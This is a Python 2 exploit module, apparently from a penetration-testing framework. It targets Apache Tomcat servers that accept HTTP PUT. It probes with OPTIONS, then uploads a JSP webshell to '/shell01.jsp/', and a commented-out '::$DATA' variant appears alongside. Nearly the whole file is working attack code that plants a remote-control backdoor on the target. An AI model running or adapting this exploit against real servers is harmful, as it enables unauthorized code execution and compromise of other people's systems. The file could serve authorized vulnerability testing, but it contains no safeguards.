# coding:utf-8
import httplib

from EXP.exp_template import Exploit, Level
from conf import config

"""
构造函数需要传递一下参数
url   测试目标的url,只需要IP+端口
exp需要实现的方法为meta_info和exploit
create by swm  2018/07/04
done:
可以直接将webshell写入到运行目录下
"""


class CVE(Exploit):

    def meta_info(self):
        return {
            'name': 'tomcatCVE',
            'author': 'swm',
            'date': '2018/07/04',
            'reference': 'tomcat.docx'
        }

    def putwebshell(self):
        webshell = config['webshell']
        try:
            conn = httplib.HTTPConnection(self.url)
            conn.request(method='OPTIONS', url='/ffffzz')
            headers = dict(conn.getresponse().getheaders())
            if 'allow' in headers and headers['allow'].find('PUT') > 0:
                conn.close()
                conn = httplib.HTTPConnection(self.url)
                url = "/" + 'shell01' + '.jsp/'
                # url = "/" + str(int(time.time()))+'.jsp::$DATA'
                conn.request(method='PUT', url=url, body=webshell)
                res = conn.getresponse()
                conn.close()
                if res.status == 201:
                    self.report('Put shell success', Level.info)
                    return True
                elif res.status == 204:
                    self.report('file exists', Level.error)
                    return False
                else:
                    self.report('unknow error', Level.error)
                    return False
            else:
                self.report('Server not vulnerable', Level.error)
                return False
        except Exception, e:
            self.report(e, Level.error)
            return False

    def exploit(self):
        if self.url == '' or (self.url.startswith('http://') and self.url.startswith('https://')):
            self.report('url error', Level.error)
            return
        res = self.putwebshell()
        if res:
            return True
        else:
            return False


if __name__ == '__main__':
    url = 'localhost:8080'
    s = CVE(url)
    res = s.exploit()
    print res
